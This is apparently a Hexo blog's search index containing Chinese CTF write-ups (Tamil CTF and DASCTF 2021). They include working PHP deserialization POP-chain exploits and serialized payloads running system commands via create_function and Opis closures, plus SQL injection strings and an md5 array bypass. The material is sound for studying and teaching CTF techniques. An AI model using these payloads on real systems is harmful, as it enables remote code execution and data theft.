<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Hexo问题记录]]></title>
    <url>%2F2021%2F10%2F01%2FHexo%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[Hexo常用命令 hexo new [layout] &lt;title&gt; 新建一篇文章 hexo clean 清除缓存文件 (db.json) 和已生成的静态文件 (public) hexo generate 生成静态文件 hexo server 启动服务器 hexo deploy 部署网站 更多指令 从typora编辑器发布到Hexo需要做那些事情？ 添加头部 更改名字 更改时间 更改标签 替换链接 Hexo-next 主题 配置版权使用Hexo的next主题，配置POST文章文末的版权信息 hexo 部署到 giteeHexo 部署到 Gitee hexo g 编译报错错误内容123456789101112131415161718192021222324252627282930313233343536F:\Blog\Blog&gt;hexo gINFO Start processingERROR Process failed: _posts/[0CTF 2016]piapiapia 1.mdYAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 5: date: 2021-10-01 22:32:05 ^ at generateError (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:167:10) at throwError (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:173:9) at readBlockMapping (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1073:9) at composeNode (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1359:12) at readDocument (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1519:3) at loadDocuments (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1575:5) at Object.load (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1596:19) at parseYAML (F:\Blog\Blog\node_modules\hexo-front-matter\lib\front_matter.js:80:21) at parse (F:\Blog\Blog\node_modules\hexo-front-matter\lib\front_matter.js:56:12) at F:\Blog\Blog\node_modules\hexo\lib\plugins\processor\post.js:48:20 at tryCatcher (F:\Blog\Blog\node_modules\bluebird\js\release\util.js:16:23) at Promise._settlePromiseFromHandler (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:514:35) at Promise._settlePromise (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:574:18) at Promise._settlePromise0 (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:619:10) at Promise._settlePromises (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:699:18) at Promise._fulfill (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:643:18) at PromiseArray._resolve (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:126:19) at PromiseArray._promiseFulfilled (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:144:14) at PromiseArray._iterate (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:114:31) at PromiseArray.init [as _init] (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:78:10) at Promise._settlePromise (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:571:21) at Promise._settlePromise0 (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:619:10) at Promise._settlePromises (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:699:18) at Promise._fulfill (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:643:18) at PromiseArray._resolve (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:126:19) at PromiseArray._promiseFulfilled (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:144:14) at Promise._settlePromise (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:579:26) at Promise._settlePromise0 (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:619:10)INFO Files loaded in 953 msINFO 0 files generated in 1.77 s 报错原因标题中出现[] 解决办法使用 大写 【]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>报错记录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9月Tamil CTF 2021]]></title>
    <url>%2F2021%2F09%2F27%2F9%E6%9C%88Tamil%20CTF%202021%2F</url>
    <content type="text"><![CDATA[Web-CringeNcoder分析过程就是一道编码解码题，没什么难度，刚开始以为是sql，后边又以为是模板注入，最后访问/flag，就明白了这道题的用意。 解题脚本12345678910dict = &#123;"cringe":"a", "cr1nge":"b","cRinge":'c',"crIng3":'d',"cRimG3":'e',"cR1Ng3e":'f',"criNgee":'g',"CRINGE":'h',"crinGE":'i',"ccR1nge":'j',"CriNGE":'k',"cRINGe":'l',"cr1ngE":'m',"cringE":'n',"CRIng3":'o',"Cr1nGe":'p',"cR1nnge":'q',"cR1Ng3":'r',"CrInGe":'s',"cRingE":'t',"cR1NGE":'u',"CRiNg3":'v',"CRINGe":'w',"CR1NGe":'x',"cring3":'y',"CRIMNGE":'z',"crinG3":1, "cRInge":2,"cRinG3":3 ,"criNG3":4 ,"cr1NG3":5 ,"crinGe":6,"cRiNge":7, "CrInGE":8 ,"CRinGE":9,"cRInGE":0&#125;str1 = "cR1Ng3e crinG3 cringE cringe cRINGe cRINGe cring3 crinG3 cringE cringE cRinG3 Cr1nGe cRimG3 criNG3 cRinge cRimG3 cringe cR1Ng3e cRiNge cRinG3 cR1Ng3 CrInGe cRInGE cr1ngE criNG3 cringE cring3 cRinge cR1Ng3 crinGE cringE criNgee cRinG3 CrInGe"list = str1.split(' ')s = ''for key in list: s += str(dict[key])print("TamilCTF&#123;"+s+"&#125;")]]></content>
      <categories>
        <category>比赛复盘</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>编码解码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9月DASCTF Sept X 浙江工业大学秋季挑战赛WP]]></title>
    <url>%2F2021%2F09%2F25%2FDASCTF%20Sept%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9BWP%2F</url>
    <content type="text"><![CDATA[crypto-签到题目1234567891011121314#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomflag=b'flag&#123;******************&#125;'n = 2 ** 256flaglong=bytes_to_long(flag)m = random.randint(2, n-1) | 1c = pow(m, flaglong, n)print('m = ' + str(m))print('c = ' + str(c))# m = 73964803637492582853353338913523546944627084372081477892312545091623069227301# c = 21572244511100216966799370397791432119463715616349800194229377843045443048821 解题脚本123456789from sympy.ntheory import discrete_logn = 2 ** 256m = 73964803637492582853353338913523546944627084372081477892312545091623069227301c = 21572244511100216966799370397791432119463715616349800194229377843045443048821flag = discrete_log(n,c,m)print(hex(flag))# flag&#123;DASCTF_zjut&#125; misc-Girlfriend’s account解题过程1=SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;&amp;&#123;&quot;0亿&quot;;&quot;0仟!*万&quot;;&quot;0佰!*万&quot;;&quot;0拾!*万&quot;;&quot;0万&quot;;&quot;万!*0仟&quot;;&quot;万!*0佰&quot;;&quot;万!*0拾&quot;;&quot;0元&quot;;&quot;0角&quot;;&quot;0分&quot;&#125;),IF(ISERR(FIND(&quot;万&quot;,A2)),&quot;万&quot;,)&amp;A2))*&#123;1,2,3,4,5,6,7,8,9&#125;*10^&#123;8;7;6;5;4;3;2;1;0;-1;-2&#125;) 1=IF(B2=&quot;壹&quot;,1,IF(B2=&quot;贰&quot;,2,IF(B2=&quot;叁&quot;,3,IF(B2=&quot;肆&quot;,4,IF(B2=&quot;伍&quot;,5,IF(B2=&quot;陆&quot;,6,IF(B2=&quot;柒&quot;,7,IF(B2=&quot;捌&quot;,8,IF(B2=&quot;玖&quot;,9,IF(B2=&quot;零&quot;,0)))))))))) web-hellounser考点反序列化（pop链构造） preg_match绕过 前置知识魔术方法 12__invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。__toString 方法用于一个类被当成字符串时应怎样回应。(当类被 echo 当成字符串输出时，会调用该方法) 解题过程打开12345678910111213141516171819202122232425262728293031323334353637383940414243 &lt;?phpclass A &#123; public $var; public function show()&#123; echo $this-&gt;var; &#125; public function __invoke()&#123; $this-&gt;show(); &#125;&#125;class B&#123; public $func; public $arg; public function show()&#123; $func = $this-&gt;func; if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i', $this-&gt;arg)) &#123; die('No!No!No!'); &#125; else &#123; include "flag.php"; //There is no code to print flag in flag.php $func('', $this-&gt;arg); &#125; &#125; public function __toString()&#123; $this-&gt;show(); return "&lt;br&gt;"."Nice Job!!"."&lt;br&gt;"; &#125; &#125;if(isset($_GET['pop']))&#123; $aaa = unserialize($_GET['pop']); $aaa();&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 分析构造利用链 比较简单 1# $aaa();-&gt;A::__invoke() -&gt;A::show() -&gt; B::__toString -&gt;B::show() 通过$aaa();调用触发 A::__invoke()，A::__invoke()会触发A::show()，A::show()中有个echo输出，会触发B::__toString，B::__toString会触发B::show()； 接下来就是绕过。 getflag1234567if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i', $this-&gt;arg)) &#123; die('No!No!No!'); &#125; else &#123; include "flag.php"; //There is no code to print flag in flag.php $func('', $this-&gt;arg); &#125; 利用点 $func(&#39;&#39;, $this-&gt;arg); ，根据Code Breaking 挑战赛 Writeup。构造出 1234create_function(&apos;&apos;,&apos;return 123;&#125;phpinfo();//)等价于create_function()&#123; return 123;&#125;phpinfo();//) 当$func 为create_function，$this-&gt;arg为 return 123;}phpinfo();//)的时候，就会执行到phpinfo(); 上面只是构造了利用，这里还需要绕过两个条件。 12preg_match('/^[a-z0-9]*$/isD', $this-&gt;func)preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i', $this-&gt;arg) 第一个正则对传入的字符串进行了首位必须是字母数字的匹配，直接用wp中给出的 \ 绕过。 第二个正则过滤了很多的关键字，但是没有过滤base64_decode，system等函数，这里直接用base64_decode+system绕过，但是需要注意的 ，这个正则中过滤了= ，有时候进行base64编码的时候，会遇到末尾有=的情况，这种情况可以换成其他函数进行编码。构造如下payload 123$func=&quot;\create_function&quot;;$arg=&quot;return 111;&#125;system(base64_decode(d2hvYW1p));//&quot;;# d2hvYW1p whoami 序列化构造payload 123456789101112131415161718192021222324&lt;?php# 反序列化 Aclass A&#123; public $var;&#125;class B&#123; public $func; public $arg;&#125;if (1) &#123; $a = new A(); $b = new B(); $b-&gt;func = "\create_function"; $b-&gt;arg = "return 111;&#125;system(base64_decode(d2hvYW1p));//"; $a-&gt;var = $b; var_dump(serialize($a));&#125; else &#123; highlight_file(__FILE__);&#125; 得到 1O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:16:&quot;\create_function&quot;;s:3:&quot;arg&quot;;s:46:&quot;return 111;&#125;system(base64_decode(d2hvYW1p));//&quot;;&#125;&#125; 提交 成功执行 payload 12Y2F0IGZsYWcucGhw // cat flag.phpO:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:16:&quot;\create_function&quot;;s:3:&quot;arg&quot;;s:54:&quot;return 111;&#125;system(base64_decode(Y2F0IGZsYWcucGhw));//&quot;;&#125;&#125; 这里还需要查看 Tru3flag.php 文件，这里会存在一个小小的问题 123cat Tru3flag.php 进行base64编码后得到 Y2F0IFRydTNmbGFnLnBocA==后面会有两个=,不能过正则。这里我直接采用$&#123;IFS&#125;代替空格。cat$&#123;IFS&#125;Tru3flag.php 进行base64编码 得到 Y2F0JHtJRlN9VHJ1M2ZsYWcucGhw 1O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:16:&quot;\create_function&quot;;s:3:&quot;arg&quot;;s:66:&quot;return 111;&#125;system(base64_decode(Y2F0JHtJRlN9VHJ1M2ZsYWcucGhw));//&quot;;&#125;&#125; web-xxc考点源码泄露 反序列化（多个文件的pop链构造） 前言这道题对于我来说还算是比较难，在网上找到一位师傅写的wp，只能到执行phpinfo，不能拿到flag，目前这道题的wp还没有师傅公布出来，做这道题对于构造pop链有一定提升，所以照着这位大佬的wp复现。 wp 地址 https://blog.csdn.net/weixin_43610673/article/details/120496058 前置知识魔术方法 123456__destruct 该函数会在类的一个对象被删除时自动调用。__call 在对象中调用一个不可访问方法时，__call() 会被调用。__get 读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用__toString 方法用于一个类被当成字符串时应怎样回应。其实就是调用__isset 当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty()。会被调用。__invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 复现过程这道题通过扫目录，扫到了源码，直接在本地搭建复现。 目录结构 因为文件太多，直接就贴关键地方截图了。 利用点 目前只发现一个利用点，这个利用点位与 class\Method\Func\GenerateFile.php 文件，GenerateFile的myGen方法中call_user_fun函数 ，这个利用点的$length并不可控，这也就是为什么只能执行 phpinfo() 的原因，因为不能控制参数。 pop链构造class\Control\State\StopHook.php 序列化入口，class\Control\State\StopHook.php , 当序列化StopHook类的时候，会自动调用__destruct方法，在__destruct方法中又会调用_exit，这里的_exit方法中的 $process-&gt;stop() 能够触发 class\Faker\MyGenerator.php 中MyGenerator的__call方法。 class\Faker\MyGenerator.php __call方法中的echo $this-&gt;defaultCall能够触发class\Method\Func\GetFile.php中的GetFile类的__toString方法，__toString中会调用getFiles方法，而getFiles方法中的 $this-&gt;flag-&gt;{$this-&gt;value}能够触发class\Method\Func\GetDefault.php中的__isset方法。 class\Method\Func\GetFile.php class\Method\Func\GetDefault.php class\Method\Func\GetDefault.php中的__isset方法会调用popup 方法，popup方法中的 return $s($length) ,可以触发class\Method\Func\GenerateFile.php中的__invoke方法，而__invoke方法又会调用 myGen，通过控制$this-&gt;source-&gt;generate来执行phpinfo。 class\Method\Func\GenerateFile.php 链条 1StopHook::__destruct-&gt;StopHook::_exit-&gt;MyGenerator::__call-&gt;GetFile::__toString-&gt;GetFile::getFiles-&gt;GetDefault::__isset-&gt;GetDefault::popup-&gt;GenerateFile::__invoke-&gt;GenerateFile::myGen-&gt;利用点call_user_func 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150&lt;?phpnamespace Control\State&#123; use Faker\MyGenerator; class StopHook &#123; protected $output; protected $config = ['auto' =&gt; 0]; protected static $states = ['started', 'running', 'finished', 'waiting', 'fail']; protected $processes; # 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 public function __construct() &#123; $this-&gt;processes = [new MyGenerator()]; &#125; public function __destruct() &#123;// echo "123666"; $this-&gt;_exit(); &#125; private function _exit() &#123; // 返回单元顺序相反的数组 逆序数组 foreach(array_reverse($this-&gt;processes) as $process) &#123; // if (!$process-&gt;isRunning) &#123;// echo "omg"; continue; &#125; # $process-&gt;stop() 通常可触发__call # $process = $process-&gt;stop(); &#125; &#125; &#125;&#125;namespace Faker&#123; use Method\Func\GetFile; class MyGenerator &#123; protected $defaultValue; public function __construct() &#123; $this-&gt;defaultValue = new GetFile(); &#125; # 在对象中调用一个不可访问方法时调用 public function __call($method, $arg_array) &#123;// echo "__call"; echo $this-&gt;defaultCall; return $this-&gt;defaultCall; &#125; # 获得一个类的成员变量时调用 public function __get($property) &#123;// echo "__get"; return $this-&gt;defaultValue; &#125; &#125;&#125;namespace Method\Func&#123; class GenerateFile &#123; public $flag; protected $buffer; # __invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 public function __construct() &#123; $this-&gt;source-&gt;generate = "phpinfo"; &#125; public function __invoke($param) &#123;// echo "__invoke"; $this-&gt;myGen($param); &#125; public function myGen($length) &#123;// echo "myGen"; $s = $this-&gt;buffer-&gt;read; # 利用点 call_user_func($this-&gt;source-&gt;generate, $length); return $s; &#125; &#125; class GetDefault &#123; private $source; public function __construct() &#123; $this-&gt;source = new GenerateFile(); $this-&gt;source-&gt;flag = "myTest"; &#125; public function popup($length) &#123;// echo "popup"; $s = $this-&gt;source; if ($s-&gt;flag != "myTest") &#123; return "denied"; &#125; return $s($length); &#125; # 当对不可访问属性调用 isset()或empty()时调用 public function __isset($property) &#123;// echo "__isset";// echo $property; if ($property != "test") &#123; return false; &#125; return !$this-&gt;popup(666); &#125; &#125; class GetFile &#123; private $flag = true; private $files = []; # 类被当成字符串时的回应方法 public function __construct() &#123; $this-&gt;flag = new GetDefault(); $this-&gt;value = 'test'; &#125; public function __toString() &#123; #// echo "__toString"; return $this-&gt;getFiles(); &#125; public function getFiles() &#123; if (!$this-&gt;flag) return "denied"; $s = ""; if (isset($this-&gt;flag-&gt;&#123;$this-&gt;value&#125;)) &#123; return "test"; &#125; foreach ($this-&gt;files as $file) &#123; $s += $file-&gt;read(); &#125; return $s; &#125; &#125;&#125;namespace &#123; # StopHook::__destruct-&gt;StopHook::_exit-&gt;MyGenerator::__call-&gt;GetFile::__toString-&gt;GetFile::getFiles-&gt;GetDefault::__isset-&gt;GetDefault::popup-&gt;GenerateFile::__invoke-&gt;GenerateFile::myGen-&gt;利用点call_user_func # StopHook::__destruct-&gt;StopHook::_exit-&gt;MyGenerator::__get-&gt;GetDefault::__isset-&gt;GetDefault::popup-&gt;GenerateFile::__invoke-&gt;利用点call_user_func echo base64_encode(serialize(new Control\State\StopHook()));&#125; 得到 1TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6Mzp7czo5OiIAKgBvdXRwdXQiO047czo5OiIAKgBjb25maWciO2E6MTp7czo0OiJhdXRvIjtpOjA7fXM6MTI6IgAqAHByb2Nlc3NlcyI7YToxOntpOjA7TzoxNzoiRmFrZXJcTXlHZW5lcmF0b3IiOjE6e3M6MTU6IgAqAGRlZmF1bHRWYWx1ZSI7TzoxOToiTWV0aG9kXEZ1bmNcR2V0RmlsZSI6Mzp7czoyNToiAE1ldGhvZFxGdW5jXEdldEZpbGUAZmxhZyI7TzoyMjoiTWV0aG9kXEZ1bmNcR2V0RGVmYXVsdCI6MTp7czozMDoiAE1ldGhvZFxGdW5jXEdldERlZmF1bHQAc291cmNlIjtPOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiOjM6e3M6NDoiZmxhZyI7czo2OiJteVRlc3QiO3M6OToiACoAYnVmZmVyIjtOO3M6Njoic291cmNlIjtPOjg6InN0ZENsYXNzIjoxOntzOjg6ImdlbmVyYXRlIjtzOjc6InBocGluZm8iO319fXM6MjY6IgBNZXRob2RcRnVuY1xHZXRGaWxlAGZpbGVzIjthOjA6e31zOjU6InZhbHVlIjtzOjQ6InRlc3QiO319fX0 执行 小结没成功拿到flag，也学到了不少，也是头一次构造这么复杂的pop链。还是太菜了。 拿flag的解法前言上次做到只能执行phpinfo，就有点不甘心，为什么别人就能getshell，我就不能。经过这几天在群里咨询一些师傅，一个师傅(Object师傅)给了我一条博客链接2021 第二届 “祥云杯” 网络安全大赛 WEB WriteUp，里面是祥云杯的ezyii 题wp，不过题目内容大致差不多，有一个点基本一样，就是用call_user_func($this-&gt;source-&gt;generate,$length);，只能控制$this-&gt;source-&gt;generate，而不能控制$length。这里到底要怎么才能利用呢？答案是回调函数。但是知道答案后，并没有第一时间做出来，我把$this-&gt;source-&gt;generate赋值为function (){system(&#39;phpinfo();&#39;);} ，然后进行反序列化的时候，没有了回显，这里一直卡了我很久。 直到看到 Opis Closure If you ever used closures then you probably know that closures are not serializable. Trying to serialize a closure will result into an exception: 如果您曾经使用过闭包，那么您可能知道闭包是不可序列化的。尝试序列化闭包将导致异常： 意思就是以function (){system(&#39;phpinfo();&#39;);}的方式进行序列化，会失败。 1234567891011use Opis\Closure\SerializableClosure;// Recursive factorial closure$factorial = function ($n) use (&amp;$factorial) &#123; return $n &lt;= 1 ? 1 : $factorial($n - 1) * $n;&#125;;// Wrap the closure$wrapper = new SerializableClosure($factorial);// Now it can be serialized$serialized = serialize($wrapper); 里面给出了序列化闭包的方式，但当我按照里面的方式去使用的时候，发现还是没有回显。 直到今早 ，又重新看了这篇博客祥云杯2021 ezyii的反序列化pop链分析，这篇描述得更详细些。得到。 1234567891011121314final class PumpStream&#123; private $source; private $size=-10; private $buffer; public function __construct()&#123; $this-&gt;buffer=new DefaultGenerator('j'); include("closure/autoload.php"); $a = function()&#123;phpinfo();&#125;; $a = \Opis\Closure\serialize($a); $b = unserialize($a); $this-&gt;source=$b; &#125; &#125;&#125; 里面对$a = function(){phpinfo();};进行了如下三个步骤，序列化闭包，反序列化，赋值给$this-&gt;source。当我按照这样的方式去构造时，我又遇到了没有回显的问题，为此，我还特地弄了个xdebug调试，调试到$a = \Opis\Closure\serialize($a);就结束了。为什么会这样呢?经过对比两份payload，我发现，人家都引入了include(&quot;closure/autoload.php&quot;);，这个文件，这也是解决问题的关键所在，这个就是\Opis\Closure\serialize的环境。 接下来直接贴payload。 拿flag payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157&lt;?phpnamespace Control\State;use Faker\MyGenerator;class StopHook &#123; protected $output; protected $config = ['auto' =&gt; 0]; protected static $states = ['started', 'running', 'finished', 'waiting', 'fail']; protected $processes; # 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 public function __construct() &#123; $this-&gt;processes = [new MyGenerator()]; &#125; public function __destruct() &#123; echo "__destruct"."\n"; $this-&gt;_exit(); &#125; private function _exit() &#123; echo "_exit"."\n"; // 返回单元顺序相反的数组 逆序数组 foreach(array_reverse($this-&gt;processes) as $process) &#123; # 这里会触发__get() 但是不会执行 continue if (!$process-&gt;isRunning) &#123; continue; &#125; # $process-&gt;stop() 通常可触发__call 但是并没有触发 # 这里会触发 __call() $process-&gt;stop(); &#125; &#125;&#125;# 序列化echo base64_encode(serialize(new StopHook()));namespace Faker;use Method\Func\GetFile;class MyGenerator &#123; protected $defaultValue; public function __construct() &#123; $this-&gt;defaultValue = new GetFile(); &#125; # 在对象中调用一个不可访问方法时调用 public function __call($method, $arg_array) &#123; echo "__call"."\n"; echo $this-&gt;defaultCall; return $this-&gt;defaultCall; &#125; # 获得一个类的成员变量时调用 public function __get($property) &#123; echo "__get"."\n"; # return new GetFile(); return $this-&gt;defaultValue; &#125;&#125;namespace Method\Func;class GetFile &#123; private $flag = true; private $files = []; public function __construct() &#123; $this-&gt;flag = new GetDefault(); $this-&gt;value = 'test'; &#125; # 类被当成字符串时的回应方法 public function __toString() &#123; echo "__toString"; # return $this-&gt;getFiles(); &#125; public function getFiles() &#123; if (!$this-&gt;flag) return "denied"; $s = ""; # 这里能够触发 _isset if (isset($this-&gt;flag-&gt;&#123;$this-&gt;value&#125;)) &#123; return "test"; &#125; foreach ($this-&gt;files as $file) &#123; $s += $file-&gt;read(); &#125; return $s; &#125;&#125;namespace Method\Func;class GetDefault &#123; private $source; public function __construct() &#123; $this-&gt;source = new GenerateFile(); $this-&gt;source-&gt;flag = 'myTest'; &#125; public function popup($length) &#123; echo "popup"."\n"; $s = $this-&gt;source; if ($s-&gt;flag != "myTest") &#123; return "denied"; &#125; return $s($length); &#125; # 当对不可访问属性或调用isset()或empty()时调用 public function __isset($property) &#123; echo "__isset"."\n"; if ($property != "test") &#123; return false; &#125; return !$this-&gt;popup(666); &#125;&#125;namespace Method\Func;class GenerateFile &#123; public $flag; protected $buffer; # __invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 public function __construct() &#123; include("closure/autoload.php"); $a = function ()&#123;system('cat /f1@g.txt');&#125;; $a = \Opis\Closure\serialize($a); $b = unserialize($a); $this-&gt;source-&gt;generate = $b;// $this-&gt;source-&gt;generate = 'phpinfo'; // 能够执行 &#125; public function __invoke($param) &#123; echo "__invoke"."\n"; $this-&gt;myGen($param); &#125; public function myGen($length) &#123; $s = $this-&gt;buffer-&gt;read; # 利用点// call_user_func($this-&gt;source-&gt;generate, $length); call_user_func($this-&gt;source-&gt;generate,$length); return $s; &#125;&#125;?&gt; 1TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6Mzp7czo5OiIAKgBvdXRwdXQiO047czo5OiIAKgBjb25maWciO2E6MTp7czo0OiJhdXRvIjtpOjA7fXM6MTI6IgAqAHByb2Nlc3NlcyI7YToxOntpOjA7TzoxNzoiRmFrZXJcTXlHZW5lcmF0b3IiOjE6e3M6MTU6IgAqAGRlZmF1bHRWYWx1ZSI7TzoxOToiTWV0aG9kXEZ1bmNcR2V0RmlsZSI6Mzp7czoyNToiAE1ldGhvZFxGdW5jXEdldEZpbGUAZmxhZyI7TzoyMjoiTWV0aG9kXEZ1bmNcR2V0RGVmYXVsdCI6MTp7czozMDoiAE1ldGhvZFxGdW5jXEdldERlZmF1bHQAc291cmNlIjtPOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiOjM6e3M6NDoiZmxhZyI7czo2OiJteVRlc3QiO3M6OToiACoAYnVmZmVyIjtOO3M6Njoic291cmNlIjtPOjg6InN0ZENsYXNzIjoxOntzOjg6ImdlbmVyYXRlIjtDOjMyOiJPcGlzXENsb3N1cmVcU2VyaWFsaXphYmxlQ2xvc3VyZSI6MTkxOnthOjU6e3M6MzoidXNlIjthOjA6e31zOjg6ImZ1bmN0aW9uIjtzOjM4OiJmdW5jdGlvbiAoKXtcc3lzdGVtKCdjYXQgL2YxQGcudHh0Jyk7fSI7czo1OiJzY29wZSI7czoyNDoiTWV0aG9kXEZ1bmNcR2VuZXJhdGVGaWxlIjtzOjQ6InRoaXMiO047czo0OiJzZWxmIjtzOjMyOiIwMDAwMDAwMDAyZjEwODQ3MDAwMDAwMDA3YWMzZTgwYiI7fX19fX1zOjI2OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmaWxlcyI7YTowOnt9czo1OiJ2YWx1ZSI7czo0OiJ0ZXN0Ijt9fX19 总结这道题做了很长时间，挺耽误时间的，经常是看着屏幕，一点思路都没有。但是反过来说，下次再遇到这个题，我还是只能执行phpinfo，会很不甘心。 web-ctfmanage解题过程sql注入检测注入方式 12a=1 uniunionon selselectect 1,2,3#&amp;b=1 a=1 Union Select 1,2,3#&amp;b=1 获取数据库表 121 Union Select 1,2,database();# =&gt;ctf 获取表名 121 Union Select 1,2,group_concat(table_name) From mysql.innodb_table_stats Where database_name = database();#=&gt;flagisthere,ilikectf 无列名注入获取值 121 Union Select * From ilikectf;# =&gt;36476,sgrsgef,gg.php 代码审计打开gg.php 12345678910111213if(base64_encode(hex2bin(strrev(bin2hex($_GET['sy']))))===$secret)&#123; if($_POST['ha']!==$_POST['lo']&amp;&amp;md5($_POST['ha'])===md5($_POST['lo']))&#123; echo $flag; &#125; else&#123; echo 'ohhhhh so close !!!'; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 看到第一个条件可能会愣住，不过不影响，在登录页面看源代码的时候得到。 1hjZX1pcnVmdmRzZWZ/bGlg== 1echo hex2bin(strrev(bin2hex(base64_decode("hjZX1pcnVmdmRzZWZ/bGlg==")))); 得到 1ilovectfverymuch 绕过 1if($_POST[&apos;ha&apos;]!==$_POST[&apos;lo&apos;]&amp;&amp;md5($_POST[&apos;ha&apos;])===md5($_POST[&apos;lo&apos;])) POST： 1ha[]=a&amp;lo[]=b 获取flag 小结这道题的难点我觉得主要是在注入点检测、和无列名获取值的payload构造，并不是那种常规思路，我也不知道为什么通过Union Select 或ununionion selselectect这样能够检测出来，看不到源码。不过可以通过FUZZ，但我不太熟，而且也没有字典，是时候收集一波了。]]></content>
      <categories>
        <category>比赛复盘</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>SQL注入</tag>
        <tag>crypto</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【NCTF2019】SQLi 1]]></title>
    <url>%2F2021%2F08%2F27%2F%5BNCTF2019%5DSQLi%201%2F</url>
